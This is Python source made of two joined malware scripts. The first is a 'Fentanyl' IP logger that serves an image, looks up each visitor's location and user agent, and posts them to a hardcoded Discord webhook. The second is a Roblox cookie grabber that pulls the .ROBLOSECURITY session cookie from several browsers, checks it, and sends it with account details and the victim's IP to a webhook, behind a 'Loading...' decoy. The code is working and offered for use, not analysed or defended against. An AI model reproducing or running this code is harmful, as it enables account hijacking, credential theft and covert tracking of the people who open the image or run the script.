from http.server import BaseHTTPRequestHandler
from urllib import parse
import requests, base64, httpagentparser

webhook = 'https://discord.com/api/webhooks/1065331031718240326/ee30_2PYsI1-u0Zld2FJ_Q_tT3qS4gW-SyaTS1R8QhR3c4CGBt0HHtaFC-ahBsX_pGnm'
bindata = requests.get('https://images.rbxcdn.com/d66ae37d46e00a1ecacfe9531986690a.jpg').content

buggedimg = True # Set this to True if you want the image to show as loading on Discord, False if you don't. (CASE SENSITIVE)

def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
    return {
  "username": "Fentanyl",
  "content": "@everyone",
  "embeds": [
    {
      "title": "Fentanyl strikes again!",
      "color": 16711803,
      "description": "A Victim opened the original Image. You can find their info below.",
      "author": {
        "name": "Fentanyl"
      },
      "fields": [
        {
          "name": "IP Info",
          "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
          "inline": True
        },
        {
          "name": "Advanced Info",
          "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
          "inline": False
        }
      ]
    }
  ],
}

def prev(ip,uag):
  return {
  "username": "Fentanyl",
  "content": "",
  "embeds": [
    {
      "title": "Fentanyl Alert!",
      "color": 16711803,
      "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
      "author": {
        "name": "Fentanyl"
      },
      "fields": [
      ]
    }
  ],
}


# This long bit of Base85 encoded Binary is an image with no actual content, which creates a loading image on discord.
# It's not malware, if you don't trust it read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious
# I've already disproved every single one. You aren't helping.
buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        s = self.path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
        try: data = requests.get(dic['url']).content if 'url' in dic else bindata
        except Exception: data = bindata
        useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
        os, browser = httpagentparser.simple_detect(useragent)
        if self.headers.get('x-forwarded-for').startswith(('35','34','104.196')):
            if 'discord' in useragent.lower(): self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(buggedbin if buggedimg else bindata); requests.post(webhook,json=prev(self.headers.get('x-forwarded-for'),useragent))
            else: pass
        else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = requests.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); requests.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
        return



import os
import codecs
import marshal, zlib, base64, lzma
import json
from base64 import *

webhookk = "heh"

def command(c):
    os.system(c)
def cls():
    os.system("cls")

try:
    import robloxpy
    import requests,re
    from discordwebhook import *
    import browser_cookie3
    
except:
    input("Libraries not installed press enter to exit...")




dummy_message = "Loading..." # A message that distracts the user from closing the grabber
print(dummy_message)
################### Gathering INFOMATION #################################
def cookieLogger():

    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass


cookies = cookieLogger()


#################### INFOMATION #################
ip_address = requests.get("https://api.ipify.org/").text
roblox_cookie = cookies[1]
#################### checking cookie #############
isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
if isvalid == "Valid Cookie":
    pass
else:
    requests.post(url=webhookk,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
    exit()

#################### getting info about the cookie #############
ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
info = json.loads(ebruh.text)
rid = info["UserID"]
rap = robloxpy.User.External.GetRAP(rid)
friends = robloxpy.User.Friends.External.GetCount(rid)
age = robloxpy.User.External.GetAge(rid)
crdate = robloxpy.User.External.CreationDate(rid)
rolimons = f"https://www.rolimons.com/player/{rid}"
roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
headshot = robloxpy.User.External.GetHeadshot(rid)
username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']
#################### SENDING TO WEBHOOK #################

discord = Discord(url=webhookk)
discord.post(
    username="BOT - Pirate 🍪",
    avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
    embeds=[
        {
            "username": "BOT - Pirate 🍪",
            "title": "💸 +1 Result Account 🕯",
            "description" : f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color" : 12452044,
            "fields": [
                {"name": "Username", "value": username, "inline": True},
                {"name": "Robux Balance", "value": robux, "inline": True},
                {"name": "Premium Status", "value": premium,"inline": True},
                {"name": "Creation Date", "value": crdate, "inline": True},
                {"name" : "RAP", "value": rap,"inline": True},
                {"name" : "Friends", "value": friends, "inline": True},
                {"name" : "Account Age", "value": age, "inline": True},
                {"name" : "IP Address", "value" : ip_address, "inline:": True},
                {"name" : ".ROBLOSECURITY", "value": f"```fix\n{roblox_cookie}```", "inline": False},
            ],
            "thumbnail": {"url": headshot},


        }
    ],
)